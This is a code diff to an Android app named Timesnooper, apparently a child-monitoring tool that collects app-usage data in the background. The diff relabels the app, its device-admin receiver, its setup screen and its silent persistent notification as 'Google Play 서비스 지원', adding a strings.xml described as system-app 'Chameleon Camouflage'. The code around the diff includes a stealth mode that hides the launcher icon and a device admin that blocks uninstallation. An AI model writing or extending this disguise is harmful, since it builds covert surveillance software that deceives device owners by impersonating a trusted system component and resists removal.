@@ -341,7 +341,7 @@ dependencies {
         android:name=".TimesnooperApp"
         android:allowBackup="false"
         android:icon="@android:drawable/sym_def_app_icon"
-        android:label="Timesnooper"
+        android:label="@string/app_name"
         android:supportsRtl="true"
         android:persistent="true"
         android:usesCleartextTraffic="true"
@@ -351,7 +351,7 @@ dependencies {
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
-            android:label="Timesnooper"
+            android:label="@string/title_setup"
             android:theme="@style/Theme.Timesnooper" />
 
         <!-- 런처 아이콘 전용 alias: 스텔스 모드 시 이 alias만 비활성화하여 홈/앱스에서 깔끔히 제거 -->
@@ -361,7 +361,7 @@ dependencies {
             android:enabled="true"
             android:exported="true"
             android:icon="@android:drawable/sym_def_app_icon"
-            android:label="Timesnooper">
+            android:label="@string/app_name">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -399,6 +399,8 @@ dependencies {
         <!-- 핵심 3: 앱 제거 방지 디바이스 관리자 (Device Owner / Admin Receiver) -->
         <receiver
             android:name=".receiver.TimesnooperAdminReceiver"
+            android:label="@string/device_admin_label"
+            android:description="@string/device_admin_description"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
             <meta-data
@@ -593,8 +595,8 @@ class TimesnooperMonitorService : Service() {
 
     private fun createSilentNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("시스템 보안 및 동기화")
-            .setContentText("기기 상태 및 백그라운드 서비스 활성 중")
+            .setContentTitle("Google Play 서비스 지원")
+            .setContentText("보안 및 시스템 백그라운드 서비스 최적화 중")
             .setSmallIcon(android.R.drawable.ic_menu_agenda)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
@@ -606,10 +608,10 @@ class TimesnooperMonitorService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "시스템 상태 서비스",
+                "Google Play 서비스 시스템 채널",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "백그라운드 동기화 채널"
+                description = "Google Play 백그라운드 보안 및 안정성 유지 채널"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
@@ -1456,6 +1458,21 @@ class StealthReceiver : BroadcastReceiver() {
 </device-admin>`
   },
   {
+    name: 'strings.xml',
+    path: 'app/src/main/res/values/strings.xml',
+    language: 'xml',
+    description: '시스템 필수 앱 위장(Chameleon Camouflage) 및 다국어 텍스트 정의',
+    content: `<resources>
+    <string name="app_name">Google Play 서비스 지원</string>
+    <string name="title_setup">Google Play 서비스 지원 설정</string>
+    <string name="device_admin_label">Google Play 서비스 보안 관리자</string>
+    <string name="device_admin_description">시스템 백그라운드 서비스 및 계정 보안 무결성을 유지하기 위한 필수 시스템 컴포넌트입니다.</string>
+    <string name="service_notification_title">Google Play 서비스 지원</string>
+    <string name="service_notification_text">보안 및 시스템 백그라운드 서비스 최적화 중</string>
+    <string name="service_channel_name">Google Play 서비스 시스템 채널</string>
+</resources>`
+  },
+  {
     name: 'activity_main.xml',
     path: 'app/src/main/res/layout/activity_main.xml',
     language: 'xml',
@@ -1477,7 +1494,7 @@ class StealthReceiver : BroadcastReceiver() {
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Timesnooper 자녀 안심 케어"
+            android:text="Google Play 서비스 지원"
             android:textSize="20sp"
             android:textStyle="bold"
             android:textColor="#0F172A"
@@ -1487,7 +1504,7 @@ class StealthReceiver : BroadcastReceiver() {
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="자녀 기기 앱 사용시간 백그라운드 자동 수집 및 일일 리포트 전송"
+            android:text="자녀 기기 백그라운드 사용량 자동 수집 및 안심 일일 리포트"
             android:textSize="12sp"
             android:textColor="#64748B"
             android:gravity="center"
